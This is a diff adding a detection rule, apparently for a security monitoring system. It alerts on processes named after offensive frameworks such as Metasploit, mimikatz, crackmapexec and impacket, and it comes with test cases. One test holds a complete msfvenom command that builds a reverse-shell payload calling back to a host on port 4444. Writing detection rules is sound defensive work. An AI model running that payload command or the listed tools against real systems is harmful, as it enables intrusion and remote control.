@@ -1,0 +1,33 @@
+name: linux_hack_tool_frameworks
+mode: alert
+overlap_allowed_with: [sigma_susp_execution_tmp_folder, sigma_susp_hktl_execution]
+eval: |
+  (
+    e.process_name == "msfconsole" ||
+    e.process_name == "msfvenom" ||
+    e.process_name == "metasploit" ||
+    e.process_name == "mimikatz" ||
+    e.process_name == "crackmapexec" ||
+    e.process_name == "evil-winrm" ||
+    e.process_name == "bloodhound" ||
+    e.process_name == "impacket-smbexec" ||
+    e.process_name == "impacket-psexec" ||
+    e.process_name == "impacket-wmiexec"
+  )
+tests:
+  - cleartext: "msfconsole"
+    process_name: msfconsole
+    process_args: "msfconsole"
+    should_match: true
+  - cleartext: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf"
+    process_name: msfvenom
+    process_args: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf"
+    should_match: true
+  - cleartext: "crackmapexec"
+    process_name: crackmapexec
+    process_args: "crackmapexec"
+    should_match: true
+  - cleartext: "normal tool"
+    process_name: vim
+    process_args: "vim server.py"
+    should_match: false
